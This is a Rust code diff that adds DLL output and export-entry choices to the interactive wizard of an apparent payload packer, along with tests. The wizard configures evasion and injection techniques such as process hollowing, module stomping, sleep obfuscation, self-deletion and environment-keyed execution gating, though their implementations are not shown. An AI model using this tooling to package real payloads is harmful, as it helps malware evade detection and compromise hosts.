@@ -175,6 +175,10 @@ struct Answers {
     strings_strategy: String,
     syscalls_mode: String,
     output_path: String,
+    /// `build.output.kind`: a standalone executable or a host-loaded DLL.
+    output_kind: OutputKind,
+    /// `build.output.entry` for a DLL build (always `auto` for an executable).
+    dll_entry: DllEntry,
     /// `build.output.arch` as the wizard's answer string (`x64` / `x86`).
     arch: String,
     strip: bool,
@@ -558,10 +562,31 @@ impl Wizard<'_> {
             _ => "x86".to_string(),
         };
 
+        // The output kind gates which techniques are runnable — a DLL lives in a
+        // host process and must not touch that process's image — so it is asked
+        // before the techniques, for the same reason as `arch`.
+        let output_kind = match self.ask_select(
+            "output kind",
+            &[
+                ("exe", "a standalone executable (the default)"),
+                (
+                    "dll",
+                    "a DLL a host process loads (ctypes, P/Invoke, a JVM)",
+                ),
+            ],
+            previous
+                .map(|answers| usize::from(answers.output_kind == OutputKind::Dll))
+                .unwrap_or(0),
+        )? {
+            0 => OutputKind::Exe,
+            _ => OutputKind::Dll,
+        };
+
         self.section("TECHNIQUES")?;
         let execution = self.ask_execution(previous.map(|answers| &answers.execution))?;
         let preparations = self.ask_preparations(
             previous.map_or(&[][..], |answers| answers.preparations.as_slice()),
+            output_kind,
         )?;
 
         self.section("STUB")?;
@@ -602,9 +627,45 @@ impl Wizard<'_> {
         };
 
         self.section("OUTPUT")?;
+        // `entry` only applies to a DLL; an executable starts at `main`.
+        let dll_entry = if output_kind == OutputKind::Dll {
+            let default_entry = previous.map_or(0, |answers| dll_entry_index(&answers.dll_entry));
+            match self.ask_select(
+                "entry",
+                &[
+                    (
+                        "auto",
+                        "export `JNI_OnLoad` and `Run`, so any host can call it",
+                    ),
+                    (
+                        "jni_on_load",
+                        "export only `JNI_OnLoad` (a JVM's `System.load`)",
+                    ),
+                    ("export", "export only one function name of your choice"),
+                ],
+                default_entry,
+            )? {
+                1 => DllEntry::JniOnLoad,
+                2 => {
+                    let default_export = match previous.map(|answers| &answers.dll_entry) {
+                        Some(DllEntry::Export(name)) => name.clone(),
+                        _ => DllEntry::AUTO_EXPORT.to_string(),
+                    };
+                    DllEntry::Export(self.ask_text("export name", &default_export)?)
+                }
+                _ => DllEntry::Auto,
+            }
+        } else {
+            DllEntry::Auto
+        };
+
+        // A DLL the host loads carries the `.dll` extension, an executable
+        // `.exe`; a path the operator typed is kept only while the kind still
+        // matches it.
         let default_output = previous
+            .filter(|answers| answers.output_kind == output_kind)
             .map(|answers| answers.output_path.clone())
-            .unwrap_or_else(|| format!("./dist/{name}_packed.exe"));
+            .unwrap_or_else(|| format!("./dist/{name}_packed.{}", output_kind.label()));
         let output_path = self.ask_text("output path", &default_output)?;
         let strip = self.prompts.confirm(
             "strip symbols",
@@ -634,6 +695,8 @@ impl Wizard<'_> {
             strings_strategy,
             syscalls_mode,
             output_path,
+            output_kind,
+            dll_entry,
             arch,
             strip,
             trim_paths,
@@ -737,8 +800,19 @@ impl Wizard<'_> {
     }
 
     /// Asks which preparations to apply, then each one's parameters.
-    fn ask_preparations(&mut self, previous: &[TechniqueKind]) -> Result<Vec<TechniqueKind>> {
-        let choices = preparation_defs();
+    ///
+    /// A `kind: dll` build cannot run a preparation that acts on the *running
+    /// image* (that image is the host's), so those are not offered at all — the
+    /// same way `syscalls: indirect` is hidden on x86.
+    fn ask_preparations(
+        &mut self,
+        previous: &[TechniqueKind],
+        kind: OutputKind,
+    ) -> Result<Vec<TechniqueKind>> {
+        let choices: Vec<&'static TechniqueDef> = preparation_defs()
+            .into_iter()
+            .filter(|def| !(kind == OutputKind::Dll && is_dll_incompatible(def.name)))
+            .collect();
         let options = describe(&choices);
         let default: Vec<usize> = choices
             .iter()
@@ -754,7 +828,7 @@ impl Wizard<'_> {
         for index in selected {
             let def = choices[index];
             let previous = previous.iter().find(|step| step.name() == def.name);
-            out.push(self.ask_preparation(def, previous)?);
+            out.push(self.ask_preparation(def, previous, kind)?);
         }
         Ok(out)
     }
@@ -764,6 +838,7 @@ impl Wizard<'_> {
         &mut self,
         def: &TechniqueDef,
         previous: Option<&TechniqueKind>,
+        kind: OutputKind,
     ) -> Result<TechniqueKind> {
         self.blank()?;
         let heading = self.ui.heading(def.name);
@@ -777,7 +852,7 @@ impl Wizard<'_> {
                     _ => None,
                 });
                 Ok(TechniqueKind::Bouncer {
-                    params: self.ask_bouncer(previous)?,
+                    params: self.ask_bouncer(previous, kind)?,
                 })
             }
             "anti_debug" => {
@@ -838,7 +913,11 @@ impl Wizard<'_> {
 
     /// The bouncer gate: how the checks combine, what to do on rejection, and
     /// which checks to declare (each with its own value question).
-    fn ask_bouncer(&mut self, previous: Option<&bouncer::Params>) -> Result<bouncer::Params> {
+    fn ask_bouncer(
+        &mut self,
+        previous: Option<&bouncer::Params>,
+        kind: OutputKind,
+    ) -> Result<bouncer::Params> {
         let mode = match self.ask_select(
             "mode",
             &[
@@ -850,20 +929,26 @@ impl Wizard<'_> {
             0 => bouncer::Mode::All,
             _ => bouncer::Mode::Any,
         };
-        let on_fail = match self.ask_select(
-            "on_fail",
-            &[
-                ("silent", "stop with exit code 0"),
-                ("exit", "stop with exit code 1"),
-            ],
-            matches!(
-                previous.map(|params| params.on_fail),
-                Some(bouncer::OnFail::Exit)
-            )
-            .into(),
-        )? {
-            0 => bouncer::OnFail::Silent,
-            _ => bouncer::OnFail::Exit,
+        // `on_fail: exit` calls `std::process::exit`, which would kill the host
+        // process, so a DLL build only offers the silent rejection.
+        let on_fail = if kind == OutputKind::Dll {
+            bouncer::OnFail::Silent
+        } else {
+            match self.ask_select(
+                "on_fail",
+                &[
+                    ("silent", "stop with exit code 0"),
+                    ("exit", "stop with exit code 1"),
+                ],
+                matches!(
+                    previous.map(|params| params.on_fail),
+                    Some(bouncer::OnFail::Exit)
+                )
+                .into(),
+            )? {
+                0 => bouncer::OnFail::Silent,
+                _ => bouncer::OnFail::Exit,
+            }
         };
 
         let checks: [(&str, &str); 9] = [
@@ -975,6 +1060,22 @@ fn trim_index(trim: TrimPaths) -> usize {
     }
 }
 
+/// The index of a [`DllEntry`] in the wizard's entry menu.
+fn dll_entry_index(entry: &DllEntry) -> usize {
+    match entry {
+        DllEntry::Auto => 0,
+        DllEntry::JniOnLoad => 1,
+        DllEntry::Export(_) => 2,
+    }
+}
+
+/// A preparation a `kind: dll` build cannot run: both act on the *running image*
+/// (`GetModuleHandleA(NULL)`), which in a DLL build is the host process.
+/// `plan::validate` rejects them, so the wizard must not offer them.
+fn is_dll_incompatible(name: &str) -> bool {
+    matches!(name, "self_deletion" | "sleep_obfuscation")
+}
+
 /// The registered Execution techniques, in registry order.
 fn execution_defs() -> Vec<&'static TechniqueDef> {
     techniques::all()
@@ -1079,10 +1180,8 @@ fn assemble(payload: &Path, answers: &Answers) -> Plan {
             },
             output: OutputPlan {
                 path: PathBuf::from(&answers.output_path),
-                // The wizard assembles the standalone executable; a host-loaded
-                // DLL (`kind`/`entry`) is an advanced setting, edit it in the YAML.
-                kind: OutputKind::Exe,
-                entry: DllEntry::Auto,
+                kind: answers.output_kind,
+                entry: answers.dll_entry.clone(),
                 arch: if answers.arch == "x86" {
                     Arch::X86
                 } else {
@@ -1300,13 +1399,13 @@ mod tests {
         assert_eq!(default_name(Path::new("payload")), "payload");
     }
 
-    /// Ten blank first-pass answers plus a blank review selection (`build now`)
-    /// produce a plan the packer accepts as-is.
+    /// Twelve blank first-pass answers plus a blank review selection (`build
+    /// now`) produce a plan the packer accepts as-is.
     #[test]
     fn defaults_produce_a_valid_reflective_plan() {
         let dir = temp_dir("defaults");
         let plan_path = dir.join("out.yaml");
-        let answers = ["", "", "", "", "", "", "", "", "", "", ""];
+        let answers = ["", "", "", "", "", "", "", "", "", "", "", ""];
 
         let (written, transcript) = session("payload.exe", &answers, Some(&plan_path));
 
@@ -1319,6 +1418,11 @@ mod tests {
         let plan = load_plan(&plan_path, &BTreeMap::new()).expect("valid plan");
         assert_eq!(plan.name, "payload");
         assert_eq!(plan.build.output.arch, Arch::X64, "the default arch is x64");
+        assert_eq!(
+            plan.build.output.kind,
+            OutputKind::Exe,
+            "the default output kind is exe"
+        );
         let payload = plan.build.payloads.get("payload").expect("the payload");
         assert_eq!(payload.source, "payload.exe");
         assert!(payload.args.is_none());
@@ -1357,6 +1461,7 @@ mod tests {
             "demo",
             "",
             "",
+            "",
             "module_stomping",
             "dbghelp.dll",
             "",
@@ -1383,6 +1488,7 @@ mod tests {
         let plan_path = dir.join("out.yaml");
         let answers = [
             "demo",
+            "",
             "",
             "",
             "early_bird",
@@ -1430,6 +1536,8 @@ mod tests {
                 strings_strategy: "xor".to_string(),
                 syscalls_mode: "none".to_string(),
                 output_path: "./dist/demo_packed.exe".to_string(),
+                output_kind: OutputKind::Exe,
+                dll_entry: DllEntry::Auto,
                 arch: "x64".to_string(),
                 strip: true,
                 trim_paths: TrimPaths::All,
@@ -1474,6 +1582,7 @@ mod tests {
             "demo",              // name
             "a,b",               // payload args
             "2",                 // arch -> x86
+            "",                  // output kind -> exe
             "process_hollowing", // execution
             "",                  // target -> default
             "1",                 // preparation: bouncer
@@ -1525,6 +1634,96 @@ mod tests {
         );
     }
 
+    /// `kind: dll` turns the wizard into a DLL build: it asks for the entry, the
+    /// default path carries the `.dll` extension, and the preparations that act
+    /// on the running image are not offered (a DLL's image is the host's).
+    #[test]
+    fn a_dll_build_asks_for_the_entry_and_hides_image_scoped_preparations() {
+        let dir = temp_dir("dll");
+        let plan_path = dir.join("out.yaml");
+        let answers = [
+            "demo",   // name
+            "",       // payload args
+            "",       // arch -> x64
+            "dll",    // output kind
+            "",       // execution -> reflective_loading
+            "",       // preparation -> none
+            "",       // strings
+            "",       // syscalls
+            "export", // entry
+            "Start",  // export name
+            "",       // output path -> default
+            "",       // strip
+            "",       // trim paths
+            "",       // review -> build now
+        ];
+
+        let (written, transcript) = session("payload.exe", &answers, Some(&plan_path));
+        assert_eq!(written.as_deref(), Some(plan_path.as_path()));
+
+        let plan = load_plan(&plan_path, &BTreeMap::new()).expect("valid plan");
+        let output = &plan.build.output;
+        assert_eq!(output.kind, OutputKind::Dll);
+        assert_eq!(output.entry, DllEntry::Export("Start".to_string()));
+        assert_eq!(
+            output.path,
+            PathBuf::from("./dist/demo_packed.dll"),
+            "a DLL build defaults to the `.dll` extension"
+        );
+
+        // `self_deletion` and `sleep_obfuscation` rewrite the running image,
+        // which in a DLL build is the host, so `plan::validate` rejects them and
+        // the wizard must not offer them at all.
+        assert!(
+            !transcript.contains("self_deletion") && !transcript.contains("sleep_obfuscation"),
+            "image-scoped preparations must be hidden in a DLL build: {transcript}"
+        );
+    }
+
+    /// A DLL build never offers `bouncer`'s `on_fail: exit` (which would kill the
+    /// host process), so the bouncer question flow is one prompt shorter.
+    #[test]
+    fn a_dll_build_never_offers_the_process_killing_bouncer_rejection() {
+        use crate::techniques::bouncer;
+
+        let dir = temp_dir("dll_bouncer");
+        let plan_path = dir.join("out.yaml");
+        let answers = [
+            "demo", // name
+            "",     // payload args
+            "",     // arch -> x64
+            "dll",  // output kind
+            "",     // execution -> reflective_loading
+            "1",    // preparation: bouncer
+            "",     // bouncer mode -> all
+            "1",    // checks: hostname
+            "PC-*", // hostname
+            "",     // strings
+            "",     // syscalls
+            "",     // entry -> auto
+            "",     // output path
+            "",     // strip
+            "",     // trim paths
+            "",     // review -> build now
+        ];
+
+        let (written, _) = session("payload.exe", &answers, Some(&plan_path));
+        assert_eq!(written.as_deref(), Some(plan_path.as_path()));
+
+        let plan = load_plan(&plan_path, &BTreeMap::new()).expect("valid plan");
+        let TechniqueKind::Bouncer { params } = &plan.runtime[0].technique else {
+            panic!("expected a bouncer first, got {:?}", plan.runtime[0]);
+        };
+        assert_eq!(params.mode, bouncer::Mode::All);
+        assert_eq!(params.hostname.as_deref(), Some("PC-*"));
+        assert_eq!(
+            params.on_fail,
+            bouncer::OnFail::Silent,
+            "a DLL build must never select the exiting rejection"
+        );
+        assert_eq!(plan.build.output.kind, OutputKind::Dll);
+    }
+
     /// Choosing `edit answers` at the review re-asks the questions with the
     /// previous values as defaults, so a single field can be corrected.
     #[test]
@@ -1535,6 +1734,7 @@ mod tests {
             "first",  // name
             "",       // payload args
             "",       // arch
+            "",       // output kind
             "",       // execution
             "",       // preparation
             "",       // strings
@@ -1546,6 +1746,7 @@ mod tests {
             "second", // name (corrected)
             "",       // payload args
             "",       // arch
+            "",       // output kind
             "",       // execution
             "",       // preparation
             "",       // strings
@@ -1568,7 +1769,7 @@ mod tests {
     fn quitting_the_review_writes_nothing() {
         let dir = temp_dir("aborted");
         let plan_path = dir.join("out.yaml");
-        let answers = ["", "", "", "", "", "", "", "", "", "", "3"];
+        let answers = ["", "", "", "", "", "", "", "", "", "", "", "3"];
 
         let (written, _) = session("payload.exe", &answers, Some(&plan_path));
 
